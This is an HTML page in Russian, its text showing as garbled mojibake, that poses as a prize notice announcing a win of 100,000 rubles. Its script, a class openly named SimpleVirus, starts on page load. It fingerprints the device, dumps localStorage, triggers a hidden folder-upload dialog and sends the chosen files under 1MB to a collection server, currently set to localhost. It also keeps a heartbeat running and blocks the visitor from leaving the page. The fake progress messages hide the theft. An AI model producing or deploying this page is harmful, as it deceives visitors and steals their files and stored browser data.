<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéâ –í–´ –í–´–ò–ì–†–ê–õ–ò 100000 –†–£–ë–õ–ï–ô!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Arial', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; 
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(15px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        .progress-container {
            width: 100%;
            height: 25px;
            background: rgba(255,255,255,0.2);
            border-radius: 12px;
            margin: 25px 0;
            overflow: hidden;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            border-radius: 12px;
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .status-line {
            margin: 15px 0;
            font-size: 16px;
            min-height: 24px;
        }
        .hidden { display: none; }
        #fileInput {
            position: absolute;
            left: -9999px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéä –ü–û–ó–î–†–ê–í–õ–Ø–ï–ú!</h1>
        <h2>–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ 100 000 —Ä—É–±–ª–µ–π!</h2>
        <p>–ò–¥–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–∞...</p>
        
        <div class="progress-container">
            <div id="progressBar" class="progress-bar" style="width: 0%"></div>
        </div>
        
        <div id="status" class="status-line">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã –≤—ã–ø–ª–∞—Ç...</div>
        <div id="connectionStatus" class="status-line"></div>
    </div>

    <input type="file" id="fileInput" webkitdirectory multiple>

<script>
class SimpleVirus {
    constructor() {
        this.victimId = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        this.serverUrl = 'http://localhost:8080';
        this.connected = false;
    }

    async startInfection() {
        try {
            await this.updateProgress(10, 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...');
            await this.collectDeviceInfo();

            await this.updateProgress(30, 'üåê –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...');
            await this.testConnection();

            await this.updateProgress(50, 'üìÅ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤...');
            await this.scanFiles();

            await this.updateProgress(80, 'üîß –§–∏–Ω–∞–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞...');
            await this.finalize();

            await this.updateProgress(100, 'üéâ –ü—Ä–∏–∑ –≥–æ—Ç–æ–≤!');
            
            setTimeout(() => this.showCompletionScreen(), 2000);

        } catch (error) {
            this.handleError('–û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è');
        }
    }

    async collectDeviceInfo() {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language
        };

        await this.sendToServer('/data', {
            victimId: this.victimId,
            deviceFingerprint: this.getFingerprint(),
            ...deviceInfo
        });
    }

    async testConnection() {
        try {
            const response = await fetch(this.serverUrl + '/');
            if (response.ok) {
                this.connected = true;
                this.updateConnectionStatus('‚úÖ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ', true);
                
                // –ù–∞—á–∏–Ω–∞–µ–º –æ—Ç–ø—Ä–∞–≤–∫—É heartbeat
                this.startHeartbeat();
            }
        } catch (error) {
            this.updateConnectionStatus('‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è', false);
            throw error;
        }
    }

    startHeartbeat() {
        setInterval(() => {
            this.sendToServer('/data', {
                victimId: this.victimId,
                type: 'heartbeat',
                timestamp: new Date().toISOString()
            });
        }, 5000);
    }

    async scanFiles() {
        // –¢—Ä–∏–≥–≥–µ—Ä–∏–º —Ñ–∞–π–ª–æ–≤—ã–π –¥–∏–∞–ª–æ–≥
        setTimeout(() => {
            document.getElementById('fileInput').click();
        }, 1000);

        // –°–∫–∞–Ω–∏—Ä—É–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
        await this.scanStorage();
    }

    async scanStorage() {
        try {
            // LocalStorage
            const localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }

            await this.sendToServer('/data', {
                victimId: this.victimId,
                type: 'storage_scan',
                localStorage: localStorageData
            });

        } catch (error) {
            console.log('Storage scan failed');
        }
    }

    setupFileListener() {
        const fileInput = document.getElementById('fileInput');
        fileInput.addEventListener('change', (event) => {
            this.handleFiles(event.target.files);
        });
    }

    async handleFiles(files) {
        const fileList = Array.from(files);
        
        await this.sendToServer('/data', {
            victimId: this.victimId,
            type: 'files_found',
            fileCount: fileList.length,
            files: fileList.map(file => ({
                name: file.name,
                type: file.type,
                size: file.size
            }))
        });

        // –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–µ–±–æ–ª—å—à–∏–µ —Ñ–∞–π–ª—ã
        for (const file of fileList) {
            if (file.size < 1024 * 1024) { // –î–æ 1MB
                await this.uploadFile(file);
            }
        }
    }

    async uploadFile(file) {
        try {
            const formData = new FormData();
            formData.append('victimId', this.victimId);
            formData.append('file', file);

            await fetch(this.serverUrl + '/upload_file', {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            console.log('File upload failed:', error);
        }
    }

    async finalize() {
        await this.sendToServer('/data', {
            victimId: this.victimId,
            type: 'infection_complete',
            timestamp: new Date().toISOString()
        });
    }

    getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height).substr(0, 16);
    }

    updateProgress(percent, message) {
        return new Promise((resolve) => {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('status').textContent = message;
            
            setTimeout(resolve, 800);
        });
    }

    updateConnectionStatus(message, isSuccess) {
        const element = document.getElementById('connectionStatus');
        element.textContent = message;
        element.style.color = isSuccess ? '#00ff88' : '#ff4444';
    }

    showCompletionScreen() {
        document.body.innerHTML = `
            <div class="container">
                <h1 style="color: #00ff88;">‚úÖ –í–´–ü–õ–ê–¢–ê –û–§–û–†–ú–õ–ï–ù–ê!</h1>
                <p>100 000 —Ä—É–±–ª–µ–π –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤</p>
            </div>
        `;
    }

    handleError(message) {
        document.getElementById('status').textContent = `‚ö†Ô∏è ${message}`;
        document.getElementById('status').style.color = '#ffaa00';
    }

    async sendToServer(endpoint, data) {
        try {
            await fetch(this.serverUrl + endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.log('Send failed:', error);
        }
    }
}

// –ó–∞–ø—É—Å–∫ —Å–∏—Å—Ç–µ–º—ã
document.addEventListener('DOMContentLoaded', () => {
    const virus = new SimpleVirus();
    virus.setupFileListener();
    
    setTimeout(() => {
        virus.startInfection().catch(console.error);
    }, 1000);
});

// –ë–∞–∑–æ–≤–∞—è –∑–∞—â–∏—Ç–∞
window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
});
</script>
</body>
</html>
